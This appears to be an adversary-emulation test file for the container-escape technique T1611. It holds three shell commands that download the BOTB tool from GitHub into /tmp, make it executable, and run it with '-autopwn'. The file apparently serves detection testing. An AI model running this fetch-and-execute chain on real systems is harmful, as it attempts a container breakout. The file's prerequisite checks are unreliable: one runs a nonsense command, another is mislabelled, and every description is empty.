attack_technique: T1611
display_name: Download Malware
atomic_tests:
- name: Download the BOTB malware to a container
  description: |
  supported_platforms:
  - linux 
  - containers
  dependencies:
  - description: |
      Checks for wget
    prereq_command: |
      which dgfhjdfghj
    get_prereq_command: |
      echo "No wget found"
  executor:
    command: |
      wget -nv https://github.com/brompwnie/botb/releases/download/1.8.0/botb-linux-amd64 -O /tmp/botb 
    name: sh
    elevation_required: false
- name: Chmod +x the downloaded botb malware
  description: |
  supported_platforms:
  - linux 
  - containers
  dependencies:
  - description: |
      Checks for wget
    prereq_command: |
      [ -d /tmp ]
    get_prereq_command: |
      echo "No /tmp found"
  executor:
    command: |
      chmod +x /tmp/botb 
    name: sh
    elevation_required: false
- name: Execute the downloaded botb malware from /tmp
  description: |
  supported_platforms:
  - linux 
  - containers
  dependencies:
  - description: |
      Checks for existence of /tmp
    prereq_command: |
      [ -d /tmp ]
    get_prereq_command: |
      echo "/tmp not found"
  executor:
    command: |
      /tmp/botb -autopwn
    name: sh
    elevation_required: false

